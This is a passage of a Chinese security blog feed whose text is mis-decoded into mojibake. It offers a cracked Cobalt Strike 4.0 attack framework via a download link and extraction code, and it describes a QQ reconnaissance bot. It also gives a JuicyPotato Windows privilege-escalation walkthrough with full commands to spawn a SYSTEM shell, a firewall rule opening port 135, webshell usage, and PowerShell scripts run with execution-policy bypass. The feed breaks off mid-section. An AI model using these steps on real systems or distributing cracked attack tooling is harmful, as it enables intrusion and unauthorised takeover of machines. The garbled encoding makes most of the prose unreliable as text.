      <url>/2020/03/21/%E8%87%AA%E5%88%B6CS-4-0-%E5%8E%BB%E6%9A%97%E6%A1%A9-VNC%E4%BF%AE%E5%A4%8D-x64Payload%E4%BF%AE%E5%A4%8D-%E7%BB%88%E6%9E%81%E6%B1%89%E5%8C%96%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>ä¸¤å¤©è¿‡å»äº†ï¼Œæˆ‘çŸ¥é“ï¼Œå¤§å®¶éƒ½åœ¨ç­‰CSå®Œç¾ç ´è§£ç‰ˆ</p><p>ä»CS4.0å‡ºäº†ä»¥åï¼Œè¶³è¶³æŠ˜è…¾ä¸¤å¤©äº†ã€‚æš—æ¡©,x64 payload,vncæ”¯æŒç­‰ç­‰é—®é¢˜å±‚å‡ºä¸ç©·</p><p>è€Œä¸”å®˜æ–¹ä¹Ÿæ²¡æœ‰ç¼–å†™windowsä¸‹å¯åŠ¨teamserverçš„æ‰¹å¤„ç†æ–‡ä»¶</p><p>è‡ªå·±åŠ¨æ‰‹ï¼Œä¸°è¡£è¶³é£Ÿï¼</p><p>å‚è€ƒå…ˆçŸ¥ä¸€ä½å¸ˆå‚…å’Œå›½å¤–æŸç‰›çš„ä¿®å¤æ–¹æ³•ï¼ŒCS4.0å»æš—æ¡©ï¼Œwindows teamserveræ”¯æŒï¼Œvncä¿®å¤ï¼Œx64 payloadä¿®å¤ï¼Œæ±‰åŒ–æ”¯æŒ ç»ˆæç‰ˆæœ¬ä»Šå¤©å‘å¸ƒï¼ï¼</p><p>å¦‚æœä¸éœ€è¦æ±‰åŒ–çš„è¯ï¼Œåœ¨start.batä¸­å»æ‰agentå³å¯</p><p>ç«™ç€å¹²å˜›ï¼Œè¿›æ¥ç™½å«–å•Š</p><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/11rJVvgKviN82sVOrpHoSlg">https://pan.baidu.com/s/11rJVvgKviN82sVOrpHoSlg</a><br>æå–ç ï¼šz44m</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191702649.png" alt="8RwtOS.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> å®‰å…¨å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®ç°èµ„äº§æœé›†QQæœºå™¨äºº</title>
      <link href="/2019/12/19/%E5%AE%9E%E7%8E%B0%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
      <url>/2019/12/19/%E5%AE%9E%E7%8E%B0%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01å‘½ä»¤åŠåŠŸèƒ½æ¼”ç¤º"><a href="#0x01å‘½ä»¤åŠåŠŸèƒ½æ¼”ç¤º" class="headerlink" title="0x01å‘½ä»¤åŠåŠŸèƒ½æ¼”ç¤º"></a>0x01å‘½ä»¤åŠåŠŸèƒ½æ¼”ç¤º</h2><p>ä¹‹å‰ä¸ºä¸€ä¸ªè®ºå›å†™äº†ä¸ªæ–‡ç« æœºå™¨äººï¼Œæœ€è¿‘åŠ ä¸Šäº†å­åŸŸåæŸ¥è¯¢å’Œèµ„äº§æœé›†åŠŸèƒ½ï¼ˆç”¨çš„è‡ªå·±çš„ä»˜è´¹æ¥å£ï¼‰</p><p>åŠ ä¸Šè¿™ä¸¤ä¸ªåŠŸèƒ½å¸Œæœ›å¯ä»¥æ–¹ä¾¿å¤§å®¶æ¸—é€æµ‹è¯•å’Œå­¦ä¹ ä½¿ç”¨</p><p>åŸæœ¬å¸Œæœ›å†™ä¸€ä¸ªQQæ¸—é€æœºå™¨äººç¼–å†™ç³»åˆ—çš„ã€‚ã€‚ä½†æ˜¯ä»‹äºæ¯”è¾ƒåˆè§„æ€§ä¸Šæ¯”è¾ƒæ•æ„Ÿå’Œæœ€è¿‘ç¼ºä¹æ—¶é—´ï¼Œæ—¥åå†åŠ¨å·¥</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191657535.png" alt="image-20230419165737517"></p><p>æœ¬æœºå™¨äººQQå·ä¸º3609079527ï¼Œç”³è¯·æ·»åŠ å¥½å‹åï¼Œæœºå™¨äººè‡ªåŠ¨åŒæ„ï¼Œè‡ªåŠ¨åŒæ„åŠ ç¾¤</p><p>æ¬¢è¿å„ä½ç¾¤ä¸»&#x2F;ç¾¤ç®¡&#x2F;å®‰å…¨çˆ±å¥½è€…æ‹‰å…¥ç¾¤ä¸­ä½¿ç”¨ï¼ˆåªå›å¤ç¾¤é‡Œï¼‰</p><p>æ‹‰å…¥ç¾¤ä¸­åï¼Œè¾“å…¥å‘½ä»¤â€œå¸®åŠ©â€å³å¯æŸ¥çœ‹ä½¿ç”¨æ–¹æ³•<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191658516.png" alt="image-20230419165849492"></p><p>ç›®å‰æ”¯æŒçš„å‘½ä»¤æœ‰</p><p>æœ€æ–°æ–‡ç« </p><p>æœ€çƒ­æ–‡ç« </p><p>æœç´¢ xxx</p><p>èµ„äº§æŸ¥è¯¢ xxx</p><p>å­åŸŸåæŸ¥è¯¢ xxx</p><h2 id="0x02æ¼”ç¤º"><a href="#0x02æ¼”ç¤º" class="headerlink" title="0x02æ¼”ç¤º#"></a>0x02æ¼”ç¤º<a href="https://www.secquan.org/Share/1070486#0x002%E6%BC%94%E7%A4%BA">#</a></h2><h3 id="èµ„äº§æŸ¥è¯¢"><a href="#èµ„äº§æŸ¥è¯¢" class="headerlink" title="èµ„äº§æŸ¥è¯¢#"></a>èµ„äº§æŸ¥è¯¢<a href="https://www.secquan.org/Share/1070486#%E8%B5%84%E4%BA%A7%E6%9F%A5%E8%AF%A2">#</a></h3><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191658590.png" alt="image-20230419165759873"></p><h3 id="å­åŸŸåæŸ¥è¯¢"><a href="#å­åŸŸåæŸ¥è¯¢" class="headerlink" title="å­åŸŸåæŸ¥è¯¢#"></a>å­åŸŸåæŸ¥è¯¢<a href="https://www.secquan.org/Share/1070486#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2">#</a></h3><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191658767.png" alt="image-20230419165817747"></p><p>å…¶ä»–åŠŸèƒ½åœ¨æ­¤ä¸è¿‡å¤šæ¼”ç¤ºï¼Œè¯·å„ä½è‡ªè¡Œä½“éªŒ</p>]]></content>
      
      
      
        <tags>
            
            <tag> å®‰å…¨å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¾®è½¯ä¸å½“æ´çš„æ¼æ´-Windowsææƒç¥å™¨JuicyPotato</title>
      <link href="/2019/09/13/%E5%BE%AE%E8%BD%AF%E4%B8%8D%E5%BD%93%E6%B4%9E%E7%9A%84%E6%BC%8F%E6%B4%9E-Windows%E6%8F%90%E6%9D%83%E7%A5%9E%E5%99%A8JuicyPotato/"/>
      <url>/2019/09/13/%E5%BE%AE%E8%BD%AF%E4%B8%8D%E5%BD%93%E6%B4%9E%E7%9A%84%E6%BC%8F%E6%B4%9E-Windows%E6%8F%90%E6%9D%83%E7%A5%9E%E5%99%A8JuicyPotato/</url>
      
        <content type="html"><![CDATA[<h2 id="0X00-Juicy-Potatoç®€ä»‹"><a href="#0X00-Juicy-Potatoç®€ä»‹" class="headerlink" title="0X00-Juicy-Potatoç®€ä»‹"></a>0X00-Juicy-Potatoç®€ä»‹</h2><p>Juicy Potatoæ±Ÿæ¹–äººç§°çƒ‚åœŸè±†ï¼Œæ˜¯åœ¨MS16-075æ¼æ´åˆ©ç”¨å·¥å…·RottenPotatoNå·¥å…·çš„åŸºç¡€ä¸Šåšäº†æ‰©å±•ï¼ˆA sugared version of RottenPotatoNG, with a bit of juice, i.e. <strong>another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM</strong>*ï¼‰</p><p>è¿½æ ¹åˆ°åº•æ˜¯ä¸€æ¬¾Windowsçš„æœ¬åœ°ææƒå·¥å…·ï¼Œåˆ©ç”¨äº†COMå¯¹è±¡è¿›è¡Œææƒï¼Œç›¸æ¯”RottenPotatoNGé€‚ç”¨èŒƒå›´æ›´åŠ å¹¿æ³›ï¼ˆæ­£å¦‚ä½œè€…æ‰€è¯´with a bit of juiceï¼‰</p><p>ä½¿ç”¨Juicy Potatoè¿™æ¬¾ææƒå·¥å…·çš„å‰ææ˜¯è·å¾—äº†SeImpersonateæˆ–è€…SeAssignPrimaryTokenæƒé™ï¼Œå› æ­¤å¸¦æœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œå¯¹æƒé™æœ‰ä¸€å®šè¦æ±‚ï¼Œå¹¶éä¸‡èƒ½ç¥å™¨</p><p>Juicy Potatoçš„é¡¹ç›®å®˜ç½‘å¦‚ä¸‹ï¼š</p><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p><p>è¿™æ¬¾ææƒå·¥å…·å…¶å®æ—©åœ¨18å¹´æœ«å°±æœ‰è€å¤–å¼€å‘å‡ºæ¥äº†ï¼Œä½†æ˜¯å§ï¼Œä¾ç„¶æ²¡æœ‰è¿›å…¥åˆ°å¾ˆå¤šäººçš„è§†é‡ä¸­ï¼Œä»Šå¤©å†™è¿™ç¯‡æ–‡ç« ä¹Ÿæ˜¯ç«™åœ¨å¾ˆå¤šå¤§ä½¬çš„è‚©è†€ä¸Šè¿›è¡Œæ€»ç»“ä¸å¼€æ–°æï¼Œå¦‚æœ‰é”™è¯¯ï¼Œå¸Œæœ›å¤§å®¶èƒ½åŠæ—¶æ–§æ­£</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191606699.png" alt="image"></p><h3 id="0x01-Juicy-potatoé¡¹ç›®åŠŸèƒ½ç‚¹"><a href="#0x01-Juicy-potatoé¡¹ç›®åŠŸèƒ½ç‚¹" class="headerlink" title="0x01-Juicy-potatoé¡¹ç›®åŠŸèƒ½ç‚¹"></a>0x01-Juicy-potatoé¡¹ç›®åŠŸèƒ½ç‚¹</h3><h5 id="â‘ Target-CLSID"><a href="#â‘ Target-CLSID" class="headerlink" title="â‘ Target CLSID"></a>â‘ Target CLSID</h5><p>é€‰æ‹©ä½ æƒ³è¦çš„ä»»ä½•CLSIDã€‚</p><p>ç›®å‰ä½œè€…çš„å®˜æ–¹githubé¡¹ç›®ä¸­å·²ç»ç»™å‡ºäº†windowsç‰ˆæœ¬çš„CLSIDåˆ—è¡¨ã€‚</p><h5 id="â‘¡COM-Listening-port"><a href="#â‘¡COM-Listening-port" class="headerlink" title="â‘¡COM Listening port"></a><strong>â‘¡COM Listening port</strong></h5><p>è®¾ç½®ä½ éœ€è¦çš„COMä¾¦å¬ç«¯å£</p><h5 id="â‘¢COM-Listening-IP-address"><a href="#â‘¢COM-Listening-IP-address" class="headerlink" title="â‘¢COM Listening IP address"></a><strong>â‘¢COM Listening IP address</strong></h5><p>è®¾ç½®COMç»„ä»¶ç›‘å¬çš„ç›®æ ‡ip</p><h5 id="â‘£Process-creation-mode"><a href="#â‘£Process-creation-mode" class="headerlink" title="â‘£Process creation mode"></a><strong>â‘£Process creation mode</strong></h5><p>å–å†³äºæ¨¡æ‹Ÿç”¨æˆ·çš„æƒé™ï¼Œæœ‰ä»¥ä¸‹ä¸‰ä¸ªé€‰æ‹©ï¼š</p><blockquote><p>CreateProcessWithToken (éœ€è¦SeImpersonateæƒé™)</p><p>CreateProcessAsUser (éœ€è¦SeAssignPrimaryTokenæƒé™)</p><p>both(ç»¼åˆä»¥ä¸Šä¸¤ç§)</p></blockquote><h5 id="â‘¤Process-to-launch"><a href="#â‘¤Process-to-launch" class="headerlink" title="â‘¤Process to launch"></a><strong>â‘¤Process to launch</strong></h5><p>å¦‚æœJuIcy potatoåˆ©ç”¨æˆåŠŸï¼Œåˆ™å¯åŠ¨å¯æ‰§è¡Œæ–‡ä»¶æˆ–è„šæœ¬</p><h5 id="â‘¥Process-Argument"><a href="#â‘¥Process-Argument" class="headerlink" title="â‘¥Process Argument"></a><strong>â‘¥Process Argument</strong></h5><p>è‡ªå®šä¹‰å·²å¯åŠ¨çš„è¿›ç¨‹å‚æ•°</p><h5 id="â‘¦ä¸è¿œç¨‹RPCæœåŠ¡å™¨äº¤äº’"><a href="#â‘¦ä¸è¿œç¨‹RPCæœåŠ¡å™¨äº¤äº’" class="headerlink" title="â‘¦ä¸è¿œç¨‹RPCæœåŠ¡å™¨äº¤äº’"></a>â‘¦ä¸è¿œç¨‹RPCæœåŠ¡å™¨äº¤äº’</h5><h3 id="0x02-Juicy-Potatoå±€é™æ€§"><a href="#0x02-Juicy-Potatoå±€é™æ€§" class="headerlink" title="0x02-Juicy-Potatoå±€é™æ€§"></a>0x02-Juicy-Potatoå±€é™æ€§</h3><p>â‘ å½“å‰ç”¨æˆ·å¿…é¡»å…·æœ‰ä»¥ä¸‹æƒé™ä¸­çš„ä¸€ç§ï¼Œæˆ–è€…ä¸¤ç§åŒæ—¶å…·å¤‡</p><p>SeImpersonateæƒé™</p><p>SeAssignPrimaryTokenæƒé™</p><p>ä»¥ä¸‹ç”¨æˆ·å…·æœ‰è¯¥æƒé™ï¼š</p><p><strong>Â·</strong> æœ¬åœ°ç®¡ç†å‘˜ç»„æˆå‘˜å’Œæœ¬åœ°æœåŠ¡å¸æˆ·</p><p><strong>Â·</strong> ç”±æœåŠ¡æ§åˆ¶ç®¡ç†å™¨å¯åŠ¨çš„æœåŠ¡</p><p><strong>Â·</strong> COMåŸºç¡€ç»“æ„å¯åŠ¨çš„å¹¶é…ç½®ä¸ºåœ¨ç‰¹å®šå¸æˆ·ä¸‹è¿è¡Œçš„COMæœåŠ¡å™¨</p><h5 id="é’ˆå¯¹ææƒçš„è¯ï¼Œä¸»è¦æ˜¯ç¬¬ä¸‰ç±»ç”¨æˆ·"><a href="#é’ˆå¯¹ææƒçš„è¯ï¼Œä¸»è¦æ˜¯ç¬¬ä¸‰ç±»ç”¨æˆ·" class="headerlink" title="é’ˆå¯¹ææƒçš„è¯ï¼Œä¸»è¦æ˜¯ç¬¬ä¸‰ç±»ç”¨æˆ·"></a>é’ˆå¯¹ææƒçš„è¯ï¼Œä¸»è¦æ˜¯ç¬¬ä¸‰ç±»ç”¨æˆ·</h5><p>å¸¸è§çš„ä¸ºLocalServiceç”¨æˆ·ï¼Œä¾‹å¦‚IISå’Œè€…sqlserverçš„ç”¨æˆ·</p><p>â‘¡å¼€å¯DCOM,å¹¶èƒ½æ‰¾åˆ°å¯ç”¨çš„COMå¯¹è±¡</p><p>â‘¢å¼€å¯RPC</p><h3 id="0x03-åŸç†-æ¥è‡ª3gå¤§ä½¬"><a href="#0x03-åŸç†-æ¥è‡ª3gå¤§ä½¬" class="headerlink" title="0x03-åŸç†(æ¥è‡ª3gå¤§ä½¬)"></a>0x03-åŸç†(æ¥è‡ª3gå¤§ä½¬)</h3><p><strong>Â·</strong> LocalServiceç”¨æˆ·é»˜è®¤å…·æœ‰SeImpersonateå’ŒSeAssignPrimaryTokenæƒé™</p><p><strong>Â·</strong> å¼€å¯SeImpersonateæƒé™åï¼Œèƒ½å¤Ÿåœ¨è°ƒç”¨CreateProcessWithTokenæ—¶ï¼Œä¼ å…¥æ–°çš„Tokenåˆ›å»ºæ–°çš„è¿›ç¨‹</p><p><strong>Â·</strong> å¼€å¯SeAssignPrimaryTokenæƒé™åï¼Œèƒ½å¤Ÿåœ¨è°ƒç”¨CreateProcessAsUseræ—¶ï¼Œä¼ å…¥æ–°çš„Tokenåˆ›å»ºæ–°çš„è¿›ç¨‹</p><p>Juicy Potatoçš„å®ç°æµç¨‹å¦‚ä¸‹ï¼š</p><p><strong>1ã€åŠ è½½COMï¼Œå‘å‡ºè¯·æ±‚ï¼Œæƒé™ä¸ºSystem</strong></p><p>åœ¨æŒ‡å®šipå’Œç«¯å£çš„ä½ç½®å°è¯•åŠ è½½ä¸€ä¸ªCOMå¯¹è±¡ã€‚</p><p>RottenPotatoNGä½¿ç”¨çš„COMå¯¹è±¡ä¸ºBITSï¼ŒCLSIDä¸º{4991d34b-80a1-4291-83b6-3328366b9097}</p><p>å¯ä¾›é€‰æ‹©çš„COMå¯¹è±¡ä¸å”¯ä¸€ï¼ŒJuicy Potatoæä¾›äº†å¤šä¸ªï¼Œè¯¦ç»†åˆ—è¡¨å¯å‚è€ƒå¦‚ä¸‹åœ°å€ï¼š</p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p><p><strong>2ã€å›åº”æ­¥éª¤1çš„è¯·æ±‚ï¼Œå‘èµ·NTLMè®¤è¯</strong></p><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œç”±äºæƒé™ä¸è¶³ï¼Œå½“å‰æƒé™ä¸æ˜¯Systemï¼Œæ— æ³•è®¤è¯æˆåŠŸã€‚</p><p><strong>3ã€é’ˆå¯¹æœ¬åœ°ç«¯å£ï¼ŒåŒæ ·å‘èµ·NTLMè®¤è¯ï¼Œæƒé™ä¸ºå½“å‰ç”¨æˆ·</strong></p><p>ç”±äºæƒé™ä¸ºå½“å‰ç”¨æˆ·ï¼Œæ‰€ä»¥NTLMè®¤è¯èƒ½å¤ŸæˆåŠŸå®Œæˆã€‚</p><p>RottenPotatoNGä½¿ç”¨çš„135ç«¯å£ã€‚</p><p>Juicy Potatoæ”¯æŒæŒ‡å®šä»»æ„æœ¬åœ°ç«¯å£ï¼Œä½†æ˜¯RPCä¸€èˆ¬é»˜è®¤ä¸º135ç«¯å£ï¼Œå¾ˆå°‘è¢«ä¿®æ”¹ã€‚</p><p><strong>4ã€åˆ†åˆ«æ‹¦æˆªä¸¤ä¸ªNTLMè®¤è¯çš„æ•°æ®åŒ…ï¼Œæ›¿æ¢æ•°æ®ï¼Œé€šè¿‡NTLMé‡æ”¾ä½¿å¾—æ­¥éª¤1(æƒé™ä¸ºSystem)çš„NTLMè®¤è¯é€šè¿‡ï¼Œè·å¾—Systemæƒé™çš„Token</strong></p><p>é‡æ”¾æ—¶éœ€è¦æ³¨æ„NTLMè®¤è¯çš„NTLM Server Challengeä¸åŒï¼Œéœ€è¦ä¿®æ­£ã€‚</p><p><strong>5ã€åˆ©ç”¨Systemæƒé™çš„Tokenåˆ›å»ºæ–°è¿›ç¨‹</strong></p><p>å¦‚æœå¼€å¯SeImpersonateæƒé™ï¼Œè°ƒç”¨CreateProcessWithTokenï¼Œä¼ å…¥Systemæƒé™çš„Tokenï¼Œåˆ›å»ºçš„è¿›ç¨‹ä¸ºSystemæƒé™ã€‚</p><p>å¦‚æœå¼€å¯SeAssignPrimaryTokenæƒé™ï¼Œè°ƒç”¨CreateProcessAsUserï¼Œä¼ å…¥Systemæƒé™çš„Tokenï¼Œåˆ›å»ºçš„è¿›ç¨‹ä¸ºSystemæƒé™</p><h3 id="0x04-åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨"><a href="#0x04-åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨" class="headerlink" title="0x04-åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨"></a><strong>0x04-åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨</strong></h3><pre><code>D:\&gt;JuicyPotato.exeJuicyPotato v0.1Mandatory args:-t createprocessè°ƒç”¨: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both-p &lt;program&gt;: è¿è¡ŒæŒ‡å®šç¨‹åº-l &lt;port&gt;: COMæœåŠ¡å™¨ä¾¦å¬ç«¯å£Optional args:-m &lt;ip&gt;: COMæœåŠ¡å™¨ä¾¦å¬åœ°å€ (é»˜è®¤ 127.0.0.1)-a &lt;argument&gt;: ä¼ é€’ç»™ç¨‹åºå‘½ä»¤è¡Œå‚æ•° (é»˜è®¤ NULL)-k &lt;ip&gt;: RPCæœåŠ¡å™¨IPåœ°å€ (é»˜è®¤ 127.0.0.1)-n &lt;port&gt;: RPCæœåŠ¡å™¨ä¾¦å¬ç«¯å£ (é»˜è®¤ 135)-c &lt;&#123;clsid&#125;&gt;: CLSID (default BITS:&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;)-z ä»…æµ‹è¯•CLSIDå¹¶æ‰“å°ä»¤ç‰Œçš„ç”¨æˆ·</code></pre><p><strong>1ã€æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™ï¼Œæ˜¯å¦ç¬¦åˆè¦æ±‚</strong></p><p>whoami &#x2F;priv</p><p>å¦‚æœå¼€å¯SeImpersonateæƒé™ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨-t t</p><p>å¦‚æœå¼€å¯SeAssignPrimaryTokenæƒé™ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨-t u</p><p>å¦‚æœå‡å¼€å¯ï¼Œå¯ä»¥é€‰æ‹©-t *</p><p>å¦‚æœå‡æœªå¼€å¯ï¼Œé‚£ä¹ˆæ— æ³•ææƒã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607994.png" alt="image"></p><p><strong>2ã€æŸ¥çœ‹RPCé»˜è®¤ç«¯å£æ˜¯å¦ä¸º135</strong></p><p>å¦‚æœè¢«ä¿®æ”¹(ä¾‹å¦‚ä¸º111)ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨-n 111æŒ‡å®šRPCç«¯å£</p><p>å¦‚æœç³»ç»Ÿç¦ç”¨äº†RPCï¼Œå¹¶ä¸æ˜¯ä¸€å®šæ— æ³•ææƒï¼Œéœ€è¦æ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼š</p><p>æ‰¾åˆ°å¦ä¸€ç³»ç»Ÿï¼Œèƒ½å¤Ÿä»¥å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œè¿œç¨‹RPCç™»å½•ï¼Œæ­¤æ—¶juicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨-k <ip></p><p>Windowsé»˜è®¤é…ç½®ä¸‹ï¼Œå…è®¸135ç«¯å£çš„å…¥ç«™è§„åˆ™å³å¯è¿›è¡Œè¿œç¨‹RPCç™»å½•ã€‚</p><p>æ·»åŠ é˜²ç«å¢™è§„åˆ™å…è®¸135ç«¯å£å…¥ç«™çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><p>netsh advfirewall firewall add rule name&#x3D;â€135â€ protocol&#x3D;TCP dir&#x3D;in localport&#x3D;135 action&#x3D;allow</p><p><strong>3ã€é€‰æ‹©å¯ç”¨çš„CLSID</strong></p><p>å‚è€ƒåˆ—è¡¨</p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p><p>æ ¹æ®ä½ çš„ç³»ç»Ÿç±»å‹é€‰æ‹©CLSIDï¼ˆEG:{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}ï¼‰</p><p>ç„¶å-cæŒ‡å®šå³å¯ </p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607177.png" alt="image"></p><p>ç›¸å…³ç³»ç»Ÿä½¿ç”¨çš„CLSIDæ–‡æœ«éƒ½ç»™å¤§å®¶æ‰“åŒ…äº†</p><p><strong>4ã€é€‰æ‹©ä¸€ä¸ªç³»ç»Ÿæœªå ç”¨çš„ç«¯å£ä½œä¸ºç›‘å¬ç«¯å£</strong></p><p>-lå‚æ•°æŒ‡å®šå³å¯</p><p>ä¾‹å¦‚ï¼Œæœ€ç»ˆå‚æ•°å¦‚ä¸‹ï¼š</p><p>JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}ï¼‰</p><p>å³ä½¿ç”¨SeImpersonateæƒé™åˆ›å»ºè¿›ç¨‹ï¼Œç›‘å¬ç«¯å£1111ï¼Œä½¿ç”¨çš„CLSIDä¸º{8BC3F05E-D86B-11D0-A075-00C04FB68820}æ¥è¿›è¡Œææƒ</p><h5 id="5-æ‰§è¡Œæ•ˆæœ"><a href="#5-æ‰§è¡Œæ•ˆæœ" class="headerlink" title="5.æ‰§è¡Œæ•ˆæœ"></a>5.æ‰§è¡Œæ•ˆæœ</h5><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607830.png" alt="image"></p><h3 id="0x05-åœ¨Webshellä¸­ä½¿ç”¨JuicyPotato"><a href="#0x05-åœ¨Webshellä¸­ä½¿ç”¨JuicyPotato" class="headerlink" title="0x05-åœ¨Webshellä¸­ä½¿ç”¨JuicyPotato"></a>0x05-åœ¨Webshellä¸­ä½¿ç”¨JuicyPotato</h3><p>webshellä¸­ä½¿ç”¨Juicy-Potatoçš„ææƒçš„è¯</p><p>Juicy potatoéœ€è¦è¿›è¡Œä¸€äº›ç‰¹æ®Šå¤„ç†ï¼Œä½¿å…¶ç›´æ¥è¿”å›ç»“æœ</p><p>å®ç°èµ·æ¥æ¯”è¾ƒç®€å•ï¼Œåœ¨æˆ‘æ–‡ç« åé™„æœ‰æ–‡ä»¶JuicyPotato-webshell.exe</p><p>å…¶é»˜è®¤ä½¿ç”¨çš„CLSIDä¸º{4991d34b-80a1-4291-83b6-3328366b9097}</p><p>ç›´æ¥æ‰§è¡ŒJuicyPotato-webshell.exe -p â€œwhoamiâ€</p><p>æˆ–è€…JuicyPotato-webshell.exe -p â€œwhoamiâ€ -c {XXXXX}å³å¯</p><p>æ‰§è¡Œæ•ˆæœå¦‚å›¾</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607572.png" alt="image"></p><h3 id="0x06-åœ¨å‘½ä»¤è¡Œä¸­æ‰¹é‡æå–å½“å‰ç³»ç»Ÿçš„CLSID"><a href="#0x06-åœ¨å‘½ä»¤è¡Œä¸­æ‰¹é‡æå–å½“å‰ç³»ç»Ÿçš„CLSID" class="headerlink" title="0x06-åœ¨å‘½ä»¤è¡Œä¸­æ‰¹é‡æå–å½“å‰ç³»ç»Ÿçš„CLSID"></a>0x06-åœ¨å‘½ä»¤è¡Œä¸­æ‰¹é‡æå–å½“å‰ç³»ç»Ÿçš„CLSID</h3><p>å®˜æ–¹ç»™å‡ºçš„codeå¦‚ä¸‹</p><pre><code class="powershell">&lt;#This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTIONThen exports to CSV#&gt;$ErrorActionPreference = &quot;Stop&quot;# Importing some requirements. .\utils\Join-Object.ps1New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@&#123;N=&#39;CLSID&#39;; E=&#123;$_.pschildname&#125;&#125; | where-object &#123;$_.appid -ne $null&#125;$APPID = Get-ItemProperty HKCR:\appid\* | select-object localservice,@&#123;N=&#39;AppID&#39;; E=&#123;$_.pschildname&#125;&#125; | where-object &#123;$_.LocalService -ne $null&#125;$RESULT = Join-Object -Left $APPID -Right $CLSID -LeftJoinProperty AppID -RightJoinProperty AppID -Type AllInRight  | Sort-Object LocalService# Preparing to Output$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace &quot;Microsoft &quot;, &quot;&quot;$TARGET = $OS -Replace &quot; &quot;,&quot;_&quot;# Make target folderNew-Item -ItemType Directory -Force -Path .\$TARGET# Output in a CSV$RESULT | Export-Csv -Path &quot;.\$TARGET\CLSIDs.csv&quot; -Encoding ascii -NoTypeInformation# Export CLSIDs list$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath &quot;.\$TARGET\CLSID.list&quot; -Encoding ascii# Visual Table$RESULT | ogv</code></pre><p>éƒ¨åˆ†ç³»ç»Ÿä¸­æ˜¯æ— æ³•æ­£å¸¸æå–çš„ï¼Œä¼šæŠ¥é”™</p><p>åœ¨æ­¤è´´ä¸Šç¬”è€…ä¿®å¤çš„powershellæå–è„šæœ¬</p><pre><code>New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@&#123;N=&#39;CLSID&#39;; E=&#123;$_.pschildname&#125;&#125; | where-object &#123;$_.appid -ne $null&#125;foreach($a in $CLSID)&#123;        Write-Host $a.CLSID&#125;</code></pre><p>ç›´æ¥æ‰§è¡ŒPowershell -ep bypass -f get-clid-2012.ps1å³å¯</p><p>æ•ˆæœå¦‚å›¾</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607804.png" alt="image"></p><h3 id="0x07-åœ¨ç›®æ ‡æœºæ‰¹é‡éªŒè¯CLSIDææƒå¯ç”¨æ€§"><a href="#0x07-åœ¨ç›®æ ‡æœºæ‰¹é‡éªŒè¯CLSIDææƒå¯ç”¨æ€§" class="headerlink" title="0x07-åœ¨ç›®æ ‡æœºæ‰¹é‡éªŒè¯CLSIDææƒå¯ç”¨æ€§"></a>0x07-åœ¨ç›®æ 